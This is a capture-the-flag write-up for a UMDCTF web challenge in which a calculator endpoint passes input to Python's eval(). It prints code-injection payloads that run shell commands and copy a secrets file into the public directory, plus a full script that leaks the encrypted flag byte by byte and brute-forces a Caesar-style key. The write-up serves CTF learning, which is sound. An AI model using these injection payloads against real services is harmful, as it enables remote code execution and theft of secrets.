# A Simple Calculator

Another challenge from the UMDCTF, also from the WEB category is about using `eval()` to extract the encrypted flag and **brute-forcing** to find a proper key to get the real flag.

Challenge description:<br>
**Calc you later! :)**

Source code was added to the challenge, so after a quick setup on the local environment, we can start looking at the application and reading the code. The main page returns an actual calculator, where we can perform simple math. With every calculation, we send a `POST` request on endpoint `/calc`.

### `Picture - calc view`

In the code, this function looks as follow:
```
@app.route('/calc', methods=['POST'])
def calc():
    val = 0
    try:
        z(request.json['f'])
        val = f"{int(eval(request.json['f']))}"
    except Exception as e:
        val = 0

    response = app.response_class(
        response=json.dumps({'result': val}),
        status=200,
        mimetype='application/json'
    )
    return response
```
## Wrong approach
Our eyes should see the `eval()` function and which is responsible for calculating math operations. So I tried locally perform **RCE** with this payload:`__import__('os').system('whoami')`
and it worked. It returns 0 as a result, because of the cast to the integer, but I saw the output in my console:

### `Picture - RCE ls`

Then, I tried to print the file with a flag and write it to a new file in the `/public` directory.

`__import__('os').system('cat /app/secrets.py > /app/public/flag_kz.txt')`

### `Picture - web flag`

And it worked, but only locally and there is why - before our payload goes to the `eval()` function it is checked by the `z()` method if it contains any forbidden characters.

```
def z(f: str):
    for w in ws:
        if w in f:
            raise Exception("nope")
    return True
```
This function checks **if we use forbidden string in payload**, and if so, it will **throw an exception**. `ws` is imported from `secrets.py` and it contains all forbidden strings. Locally it looks like this:
`ws = ['bad stuff']`, but look at the whole `secrets.py` file:

```
# note that all of this info is diff on the challenge server :)

FLAG = 'UMDCTF{hi_bob}}'
key = 7
ws = ['bad stuff']


def encrypt(text: str, key: int):
    result = ''

    for c in text:
        if c.isupper():
            c_index = ord(c) - ord('A')
            c_shifted = (c_index + key) % 26 + ord('A')
            result += chr(c_shifted)
        elif c.islower():
            c_index = ord(c) - ord('a')
            c_shifted = (c_index + key) % 26 + ord('a')
            result += chr(c_shifted)
        elif c.isdigit():
            c_new = (int(c) + key) % 10
            result += str(c_new)
        else:
            result += c

    return result


flag_enc = encrypt(FLAG, key)

```
After reading the comment, we can assume that `ws` in the real challenge environment can contain anything. At this point I already knew, that my first attempt to solve this challenge was wrong, RCE is not necessary to solve this challenge *(to the `encrypt()` function we will come back later)*.

## Flag in ASCII

Let's back to the `app.py` file and we can see that, right next to `ws`, **the encrypted flag is also imported** to that file. So instead of trying to make RCE, lets **return the encrypted flag**. There is only one problem, the response has to contain **only integers**, so I cast the characters one by one to **ASCII**.

The `ord()` function didn't work for me, that's why I used `encode()[0]` function. The final code:

```
c = 0
flag_enc = ""
while True:
    payload = f"flag_enc[{c}].encode()[0]"
    json = {"f":payload}
    resp = requests.post(url= url + "/calc", json= json)
    result_ASCII = resp.text[12:-2]
    c += 1

    if result_ASCII == 0 or result_ASCII == '':
        break

    flag_enc += chr(int(result_ASCII))
    print(result_ASCII)

print(flag_enc, " - encrypted flag")
```
The encrypted flag was: **<code>OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}**`

Now it's time to get back to the `encrypt()` function in `secrets.py`

This looks like a variation on Cesar Cipher, so I just copied the entire code snippet, but instead of subtracting the key, I'll keep adding it, to reverse the operation. Of course, I have no idea what key is on the server, but there are only 26 possibilities, so I will bruteforce them all. My final code for this exploit is below.

```
import requests

url = "https://<URL>"

c = 0
flag_enc = ""
while True:
    payload = f"flag_enc[{c}].encode()[0]"
    json = {"f":payload}
    resp = requests.post(url= url + "/calc", json= json)
    result_ASCII = resp.text[12:-2]
    c += 1

    if result_ASCII == 0 or result_ASCII == '':
        break

    flag_enc += chr(int(result_ASCII))
    print(result_ASCII)

print(flag_enc, " - encrypted flag")

for i in range(0, 26):
    key = i
    flag = ""
    for c in flag_enc:
            if c.isupper():
                c_index = ord(c) - ord('A')
                c_shifted = (c_index - key) % 26 + ord('A')
                flag += chr(c_shifted)
            elif c.islower():
                c_index = ord(c) - ord('a')
                c_shifted = (c_index - key) % 26 + ord('a')
                flag += chr(c_shifted)
            elif c.isdigit():
                c_new = (int(c) - key) % 10
                flag += str(c_new)
            else:
                flag += c
    if flag[0:6] == "UMDCTF":
        print(f"{flag}  - final flag (key={key})")
```
The final output was:

`OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}  - encrypted flag` 

`UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks!}  - final flag (key=20)`

**Thanks for reading :), and see u in the next one!**
